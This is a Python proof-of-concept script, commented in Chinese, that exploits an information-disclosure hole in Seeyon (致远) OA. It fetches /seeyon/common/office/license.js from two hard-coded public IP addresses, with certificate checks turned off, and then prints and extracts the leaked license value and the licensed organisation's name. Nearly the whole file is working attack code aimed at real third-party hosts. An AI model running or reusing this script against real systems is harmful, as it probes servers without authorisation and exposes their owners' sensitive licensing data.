#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
致远OA license.js 信息泄露漏洞验证
"""

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    "http://61.132.33.70:8888",
    "http://58.220.195.234:8888",
]

PATH = "/seeyon/common/office/license.js"

print("=" * 70)
print("  致远OA license.js 信息泄露漏洞验证")
print("=" * 70)
print()

for target in TARGETS:
    url = f"{target}{PATH}"
    print(f"\n目标: {target}")
    print("-" * 70)
    
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "keep-alive",
        }
        
        resp = requests.get(url, headers=headers, timeout=10, verify=False)
        
        print(f"路径: {PATH}")
        print(f"状态码: {resp.status_code}")
        print(f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
        print(f"Server: {resp.headers.get('Server', 'N/A')}")
        print(f"Content-Length: {len(resp.content)} bytes")
        
        if resp.status_code == 200:
            content = resp.text
            
            # 检查是否包含license信息
            if "OfficeLicese" in content or "license" in content.lower() or "授权" in content:
                print(f"\n✅ 漏洞存在！响应包含license信息:")
                print("-" * 70)
                print(content[:500])
                print("-" * 70)
                
                # 提取关键信息
                if "___OfficeLicese" in content:
                    # 提取license值
                    import re
                    match = re.search(r'___OfficeLicese\s*=\s*"([^"]+)"', content)
                    if match:
                        license_val = match.group(1)
                        print(f"\n📋 泄露的License信息:")
                        print(f"   {license_val[:200]}...")
                
                # 提取授权单位
                if "授权" in content:
                    match = re.search(r'授权(.+?)\[', content)
                    if match:
                        print(f"\n🏢 授权单位: {match.group(1)}")
            else:
                print(f"\n⚠️ 返回200但未检测到license信息")
        
        elif resp.status_code == 404:
            print(f"\n❌ 路径不存在 (404)")
        elif resp.status_code == 403:
            print(f"\n❌ 无权限访问 (403)")
        else:
            print(f"\n❌ 状态码: {resp.status_code}")
    
    except requests.exceptions.Timeout:
        print(f"\n⏱️ 连接超时")
    except requests.exceptions.ConnectionError:
        print(f"\n❌ 连接失败")
    except Exception as e:
        print(f"\n❌ 异常: {e}")

print(f"\n{'='*70}")
print("验证完成")
print("=" * 70)
